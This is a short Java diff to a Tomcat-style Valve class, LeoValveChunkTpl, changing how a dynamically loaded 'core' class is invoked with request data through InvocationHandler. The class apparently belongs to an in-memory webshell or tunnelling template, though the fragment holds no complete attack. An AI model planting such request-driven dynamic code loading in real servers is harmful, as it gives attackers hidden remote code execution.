@@ -112,8 +112,12 @@ public class LeoValveChunkTpl implements Valve {
                     responseType = 1;
                     byteArrayOutputStream = new ByteArrayOutputStream();
                     byteArrayOutputStream.write(data);
-                    Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
-                            .newInstance().equals(byteArrayOutputStream);
+                    try {
+                        ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
+                                .newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});
+                    } catch (Throwable e) {
+                        throw new IllegalStateException("Core invocation failed", e);
+                    }
                     respData = byteArrayOutputStream.toByteArray();
                 } else {
                     break;
